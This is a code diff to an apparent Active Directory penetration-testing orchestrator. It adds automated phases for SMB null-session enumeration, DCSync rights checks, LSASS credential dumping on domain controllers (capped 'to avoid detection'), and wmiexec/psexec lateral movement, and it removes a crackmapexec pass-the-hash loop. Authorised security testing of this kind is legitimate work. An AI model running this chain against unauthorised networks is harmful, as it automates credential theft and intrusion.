@@ -164,7 +164,44 @@ class Orchestrator:
             except subprocess.CalledProcessError as e:
                 self.logger.warning(f"ldap_anonymous_bind failed for {dc.ip_address} (might just be closed)")
 
-        # 3. ADnetscan.sh Wrapper (Future)
+        # 3. SMB Null Session Enumeration
+        smb_null_script = os.path.join(os.path.dirname(os.path.dirname(__file__)), '1 nocreds', 'smb_null_enum.py')
+        
+        for dc in dcs:
+            self.logger.info(f"Attempting SMB null session on {dc.ip_address}")
+            console.print(f"[cyan]  -> SMB Null Session: {dc.ip_address}[/cyan]")
+            
+            cmd = [
+                sys.executable,
+                smb_null_script,
+                "--session-dir", self.session_dir,
+                "--target-ip", dc.ip_address
+            ]
+            
+            try:
+                subprocess.run(cmd, env=env, check=True)
+            except subprocess.CalledProcessError as e:
+                self.logger.info("SMB null session blocked (expected)")
+        
+        # 4. Network Scanning (if CIDR targets provided)
+        for target in self.args.target if self.args.target else []:
+            if '/' in target:  # CIDR notation
+                self.logger.info(f"Running ADnetscan on {target}")
+                console.print(f"[cyan]  -> Network Scan: {target}[/cyan]")
+                
+                adnetscan_script = os.path.join(os.path.dirname(os.path.dirname(__file__)), '1 nocreds', 'adnetscan_db.py')
+                
+                cmd = [
+                    sys.executable,
+                    adnetscan_script,
+                    "--session-dir", self.session_dir,
+                    "--target", target
+                ]
+                
+                try:
+                    subprocess.run(cmd, env=env, check=True)
+                except subprocess.CalledProcessError as e:
+                    self.logger.error(f"ADnetscan failed for {target}")
 
 
     def run_vuln_analysis(self):
@@ -249,6 +286,64 @@ class Orchestrator:
                     self.logger.error(f"Secretsdump failed: {e}")
         else:
             self.logger.info("No admin credentials yet. Skipping secretsdump.")
+        
+        # 3. DCSync Rights Check (for all valid creds)
+        dcsync_script = os.path.join(os.path.dirname(os.path.dirname(__file__)), '6 validcreds/automated', 'dcsync_check.py')
+        
+        if valid_cred:
+            for dc in dcs:
+                logger.info(f"Checking DCSync rights for {valid_cred.username}")
+                console.print(f"[cyan]  -> DCSync Check: {valid_cred.username}[/cyan]")
+                
+                cmd = [
+                    sys.executable,
+                    dcsync_script,
+                    "--session-dir", self.session_dir,
+                    "--domain", dc.domain if dc.domain else "WORKGROUP",
+                    "--dc-ip", dc.ip_address,
+                    "--username", valid_cred.username
+                ]
+                
+                if valid_cred.password:
+                    cmd.extend(["--password", valid_cred.password])
+                elif valid_cred.ntlm_hash:
+                    cmd.extend(["--ntlm-hash", valid_cred.ntlm_hash])
+                
+                try:
+                    env = os.environ.copy()
+                    env["PYTHONPATH"] = os.getcwd() + os.pathsep + env.get("PYTHONPATH", "")
+                    subprocess.run(cmd, env=env, check=True)
+                except subprocess.CalledProcessError as e:
+                    self.logger.info(f"DCSync check completed")
+        
+        # 4. LSASS Dump (if admin creds)
+        if admin_cred:
+            lsass_script = os.path.join(os.path.dirname(os.path.dirname(__file__)), '6 validcreds/automated', 'lsass_dump.py')
+            
+            for dc in dcs[:2]:  # Limit to first 2 DCs to avoid detection
+                self.logger.info(f"Dumping LSASS on {dc.ip_address}")
+                console.print(f"[cyan]  -> LSASS Dump: {dc.ip_address}[/cyan]")
+                
+                cmd = [
+                    sys.executable,
+                    lsass_script,
+                    "--session-dir", self.session_dir,
+                    "--target-ip", dc.ip_address,
+                    "--domain", dc.domain if dc.domain else "WORKGROUP",
+                    "--username", admin_cred.username
+                ]
+                
+                if admin_cred.password:
+                    cmd.extend(["--password", admin_cred.password])
+                elif admin_cred.ntlm_hash:
+                    cmd.extend(["--ntlm-hash", admin_cred.ntlm_hash])
+                
+                try:
+                    env = os.environ.copy()
+                    env["PYTHONPATH"] = os.getcwd() + os.pathsep + env.get("PYTHONPATH", "")
+                    subprocess.run(cmd, env=env, check=True)
+                except subprocess.CalledProcessError as e:
+                    self.logger.error(f"LSASS dump failed: {e}")
 
     def run_cred_attacks(self):
         """
@@ -381,7 +476,7 @@ class Orchestrator:
         """
         Phase 5: Lateral Movement
         Executes:
-        - Pass-the-Hash attacks
+        - WMIExec, PSExec, SMBExec, AtExec (multi-method)
         - Command execution on discovered hosts
         """
         self.logger.info("Starting Lateral Movement Phase")
@@ -402,31 +497,26 @@ class Orchestrator:
         
         self.logger.info(f"Attempting lateral movement to {len(targets)} hosts with {len(admin_creds)} admin creds")
         
-        # Simple credential spraying across all hosts
-        for cred in admin_creds:
-            for target in targets:
-                console.print(f"[cyan]  -> PTH: {cred.username} @ {target.ip_address}[/cyan]")
-                
-                cmd = ["crackmapexec", "smb", target.ip_address, 
-                       "-u", cred.username, "-d", cred.domain if cred.domain else ""]
-                
-                if cred.password:
-                    cmd.extend(["-p", cred.password])
-                elif cred.ntlm_hash:
-                    cmd.extend(["-H", cred.ntlm_hash])
-                else:
-                    continue
-                
-                # Add command execution
-                cmd.extend(["-x", "whoami"])
-                
-                try:
-                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
-                    if "(Pwn3d!)" in result.stdout:
-                        self.logger.info(f"[SUCCESS] Lateral movement to {target.ip_address}")
-                        # Store in LateralMovement table (TODO)
-                except Exception as e:
-                    self.logger.debug(f"Failed: {e}")
+        # Use unified lateral movement module
+        lateral_script = os.path.join(os.path.dirname(os.path.dirname(__file__)), '6 validcreds/automated', 'lateral_movement.py')
+        
+        for method in ["wmiexec", "psexec"]:
+            self.logger.info(f"Trying lateral movement method: {method.upper()}")
+            console.print(f"[cyan]  -> Lateral Movement ({method.upper()})[/cyan]")
+            
+            cmd = [
+                sys.executable,
+                lateral_script,
+                "--session-dir", self.session_dir,
+                "--method", method
+            ]
+            
+            try:
+                env = os.environ.copy()
+                env["PYTHONPATH"] = os.getcwd() + os.pathsep + env.get("PYTHONPATH", "")
+                subprocess.run(cmd, env=env, check=True)
+            except subprocess.CalledProcessError as e:
+                self.logger.warning(f"{method} failed: {e}")
 
     def run_reporting(self):
         """Generate comprehensive penetration test reports (MD + HTML)."""
